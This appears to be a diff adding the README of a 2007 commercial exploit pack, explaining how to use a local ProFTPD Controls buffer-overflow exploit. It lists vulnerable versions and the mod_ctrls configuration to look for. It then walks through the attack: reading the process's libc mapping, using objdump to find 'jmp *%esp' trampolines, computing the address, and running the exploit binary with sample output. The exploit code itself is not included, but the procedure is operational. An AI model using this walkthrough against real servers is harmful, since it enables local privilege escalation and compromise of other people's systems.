@@ -1,0 +1,139 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+ProFTPD Controls Buffer Overflow
+
+Tested on:
+
+- Debian 3.1 : Profptd 1.2.10, 1.3.0, 1.3.0a
+		-> gcc 2.95.4
+		-> libc 2.3.6
+
+- Debian 4.0r0 : Profptd 1.3.0, 1.3.0a
+		-> Profptd 1.2.10 doesn't compile
+		-> gcc 4.1.2
+		-> libc 2.3.6.ds1-13etch2
+
+- Ubuntu 6.10 : Profptd 1.3.0, 1.3.0a 
+		-> Profptd 1.2.10 doesn't compile
+		-> gcc 4.1.2
+		-> libc 2.4-1ubuntu12.3
+
+
+Reference : 
+ http://www.coresecurity.com/?module=ContentMod&action=item&id=1594
+
+How to use the exploit
+------------------------
+
+1/ Tested if ProFTPD is compiled with mod_ctrls support
+
+It's ok :
+
+# /usr/local/bin/ftpdctl -h
+usage: ftpdctl [options]
+	-h    displays this message
+	-s    specify an alternate local socket
+	-v    displays more verbose information
+
+It's not ok :
+
+# ./ftpdctl -h
+ftpdctl:
+  Controls support disabled.
+  Please recompile proftpd using --enable-ctrls
+
+2/ Check in proftpd.conf if there is a vulnerable configuration, for
+example:
+
+ <IfModule mod_ctrls.c>
+     ControlsEngine        on
+     ControlsACLs          all allow group someuser
+     ControlsMaxClients    2
+     ControlsLog           /var/log/proftpd/controls.log
+     ControlsInterval      5
+     ControlsSocket        /tmp/ctrls.sock
+     ControlsSocketOwner   someuser someuser
+     ControlsSocketACL     allow group someuser
+ </IfModule>
+
+3/ Use the exploit d2sec_proftpd if you are on an old school system
+(tested on Debian 3.0 et Debian 4.0r0) or d2sec_proftpd_ssp if you are
+on a system with support for SSP (tested on Ubuntu 6.10).
+
+4/ Copy sh to /tmp
+
+5/ The buffer size is provided with the exploit usage.
+
+6/ The path to the socket is the variable ControlsSocket in the file
+proftpd.conf.
+
+7/ Canary argument with d2sec_proftpd_ssp exploit isn't necessary. A
+default value is provided in the exploit.
+
+8/ Trampoline argument with d2sec_proftpd_ssp exploit isn't necessary.
+A default value is provided in the exploit. With d2sec_proftpd exploit,
+use this procedure :
+
+$ ps faux|grep proftp
+root     20766  0.0  0.2   2876   752 pts/0    S+   23:20   0:00          \_ grep proftp
+nobody   20764  0.0  0.3   2416   808 ?        Ss   23:19   0:00 proftpd: (accepting connections)
+
+$ cat /proc/20764/maps | grep 'libc'
+b7d92000-b7eb9000 r-xp 00000000 03:01 48678      /lib/tls/i686/cmov/libc-2.3.6.so
+b7eb9000-b7ebe000 r-xp 00127000 03:01 48678      /lib/tls/i686/cmov/libc-2.3.6.so
+b7ebe000-b7ec0000 rwxp 0012c000 03:01 48678      /lib/tls/i686/cmov/libc-2.3.6.so
+b7ec3000-b7ec8000 r-xp 00000000 03:01 48680      /lib/tls/i686/cmov/libcrypt-2.3.6.so
+b7ec8000-b7eca000 rwxp 00004000 03:01 48680      /lib/tls/i686/cmov/libcrypt-2.3.6.so
+
+$ objdump -D /lib/tls/i686/cmov/libc-2.3.6.so | grep 'jmp' | grep 'esp'
+  11b96b:       ff e4                   jmp    *%esp
+  11c2e3:       ff e4                   jmp    *%esp
+  11c3eb:       ff 64 24 f6             jmp    *0xfffffff6(%esp)
+  11c3ef:       ff 64 24 f6             jmp    *0xfffffff6(%esp)
+  11cb2b:       ff e4                   jmp    *%esp
+  11cb2f:       ff e4                   jmp    *%esp
+  11d0db:       ff e4                   jmp    *%esp
+  125eba:       f2 ff e4                repnz jmp *%esp
+  125eca:       f2 ff 2c 1c             repnz ljmp *(%esp,%ebx,1)
+  125f8b:       ff e4                   jmp    *%esp
+  126033:       ff a4 24 00 00 5c 76    jmp    *0x765c0000(%esp)
+  126343:       ff e4                   jmp    *%esp
+  1263b3:       ff e4                   jmp    *%esp
+  1264c3:       ff e4                   jmp    *%esp
+  1266f3:       ff e4                   jmp    *%esp
+  126973:       ff e4                   jmp    *%esp
+  126a2b:       ff e4                   jmp    *%esp
+  126ab3:       ff e4                   jmp    *%esp
+  12b99b:       ff e4                   jmp    *%esp
+
+$ perl -e 'printf("0x%x\n", 0xb7d92000+0x11b96b)'
+0xb7ead96b
+
+$ ./d2sec_proftpd -b 516 -s /tmp/ctrls.sock -t 0xb7ead96b
+
+D2SEC (C) 2007, ProFTPD Controls Buffer Overflow Exploit
+
+[#] options : bufsize 516, ctrls socket /tmp/ctrls.sock, trampoline 0xb7ead96b
+[+] create and bind new d2sec socket
+[+] change d2sec socket permissions
+[+] connect to /tmp/ctrls.sock
+[+] create and send our payload
+[+] close d2sec socket
+
+[#] check and run /tmp/bleh
+
+
